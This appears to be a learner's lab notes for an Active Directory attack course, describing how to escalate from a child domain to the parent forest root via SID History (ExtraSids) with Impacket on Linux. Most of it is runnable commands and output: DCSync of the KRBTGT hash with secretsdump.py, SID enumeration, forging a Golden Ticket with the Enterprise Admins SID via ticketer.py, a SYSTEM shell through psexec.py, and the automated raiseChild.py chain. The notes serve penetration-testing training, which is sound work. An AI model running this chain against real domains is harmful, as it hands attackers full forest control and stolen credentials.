
## Overview
- **Context**: Escalate from child to parent domain in same forest via ExtraSids (SID History injection) using Linux tools (Impacket).
- **Goal**: Forge Golden Ticket with Enterprise Admins (EA) SID from parent; gain forest-wide access without membership.
- **Requirements**: Same as Windows version (KRBTGT NT hash, child SID, target user (fake OK), child FQDN, parent EA SID).
- **Automation**: raiseChild.py handles full process; manual for control/troubleshooting.
- **Warnings**: Avoid "autopwn" scripts in prod; understand manual steps. Rotate KRBTGT post-compromise.
- **Tools**: Impacket (secretsdump.py, lookupsid.py, ticketer.py, psexec.py, raiseChild.py).

## Requirements for ExtraSids (Child -> Parent)
We can also perform the attack shown in the previous section from a Linux attack host. To do so, we'll still need to gather the same bits of information:

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain
- The SID of the Enterprise Admins group of the root domain

## Gathering Data
- **KRBTGT NT Hash (Child)**: DCSync via secretsdump.py (needs child admin creds).
  ```
  secretsdump.py CHILD_DOMAIN/ADMIN_USER@CHILD_DC_IP -just-dc-user CHILD_DOMAIN/krbtgt
  ```
  - Example: 
	```
	  secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
	```
  - Output: NTLM hash (e.g., 9d765b482771505cbe97411065964d5f).
- **Child Domain SID**: SID brute via lookupsid.py.
  ```
  lookupsid.py CHILD_DOMAIN/ADMIN_USER@CHILD_DC_IP | grep "Domain SID"
  ```
  - Example: `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"`
  - Output: e.g., S-1-5-21-2806153819-209893948-922872689
  - Full brute: Shows RIDs (e.g., 500: Administrator); combine SID-RID for full user SIDs.
- **Parent EA SID**: lookupsid.py on parent DC; grep for Enterprise Admins.
  ```
  lookupsid.py CHILD_DOMAIN/ADMIN_USER@PARENT_DC_IP | grep -B12 "Enterprise Admins"
  ```
  - Example: `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"`
  - Output: Parent SID (e.g., S-1-5-21-3842939050-3880317879-2865463114) + RID 519 for EA.
  - Well-known RIDs: 519 (Enterprise Admins), etc.
- **Other Data**: Target user (e.g., "hacker" - fake OK); Child FQDN (e.g., LOGISTICS.INLANEFREIGHT.LOCAL).
- 
- ## Looking for the Domain SID

```bash
z3tssu@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"

Password:

[*] Domain SID is: S-1-5-21-2806153819-209893948-92287268
```

Next, we can rerun the command, targeting the INLANEFREIGHT Domain Controller (DC01) at 172.16.5.5 and grab the domain `SID S-1-5-21-3842939050-3880317879-2865463114` and attach the RID of the Enterprise Admins group. [Here](https://adsecurity.org/?p=1001) is a handy list of well-known SIDs.

## Grabbing the Domain SID & Attaching to Enterprise Admin's RID

```bash
z3tssu@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

Password:
[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: INLANEFREIGHT\administrator (SidTypeUser)
501: INLANEFREIGHT\guest (SidTypeUser)
502: INLANEFREIGHT\krbtgt (SidTypeUser)
512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
513: INLANEFREIGHT\Domain Users (SidTypeGroup)
514: INLANEFREIGHT\Domain Guests (SidTypeGroup)
515: INLANEFREIGHT\Domain Computers (SidTypeGroup)
516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)
517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)
518: INLANEFREIGHT\Schema Admins (SidTypeGroup)
519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
```

We have gathered the following data points to construct the command for our attack. Once again, we will use the non-existent user `hacker` to forge our Golden Ticket.

- The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f`
- The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689`
- The name of a target user in the child domain (does not need to exist!): `hacker`
- The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
- The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`

## Manual Attack Execution
- **Forge Golden Ticket**: [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) with extra SID.
  ```
  ticketer.py -nthash CHILD_KRBTGT_NT -domain CHILD_FQDN -domain-sid CHILD_SID -extra-sid PARENT_EA_SID TARGET_USER
  ```
  - Example:
    ```
    ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
    ```
  - The ticket will be saved down to our system as a [credential cache (ccache)](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) file, which is a file used to hold Kerberos credentials. Setting the `KRB5CCNAME` environment variable tells the system to use this file for Kerberos authentication attempts.

- **Set Kerberos Cache**: For auth.
  ```
  export KRB5CCNAME=TARGET_USER.ccache
  ```
  - Example: `export KRB5CCNAME=hacker.ccache`
- **Test Access**: [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) for SYSTEM shell on parent DC.
  ```
  psexec.py CHILD_FQDN/TARGET_USER@PARENT_DC_FQDN -k -no-pass -target-ip PARENT_DC_IP
  ```
  - Example: `psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5`
  - Drops into SYSTEM shell; confirm with `whoami` / `hostname`.

## Automated Attack ([raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py))
- **Full Escalation**: From child admin to parent shell.
  ```
  raiseChild.py -target-exec PARENT_DC_IP CHILD_FQDN/CHILD_ADMIN_USER
  ```
  - Example: `raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm`
  - Workflow:
    1. Detect forest FQDN.
    2. Get parent EA SID.
    3. DCSync child KRBTGT.
    4. Forge Golden Ticket.
    5. DCSync parent (e.g., Administrator/krbtgt).
    6. psexec.py shell on parent DC (SYSTEM).
  - Options: -w (save ticket), -targetRID (custom RID, default 500 Admin), -target-exec (psexec target).
- **Output**: Hashes (child/parent KRBTGT, parent Admin); psexec shell.

## Key Tools (Impacket)
- **secretsdump.py**: DCSync for hashes.
- **lookupsid.py**: SID enumeration.
- **ticketer.py**: Golden Ticket forging.
- **psexec.py**: Remote shell.
- **raiseChild.py**: Automation (avoid in prod if possible; manual for control).
- **Tips**: Use child creds for initial access; fake users work; next: cross-forest trusts (bidirectional).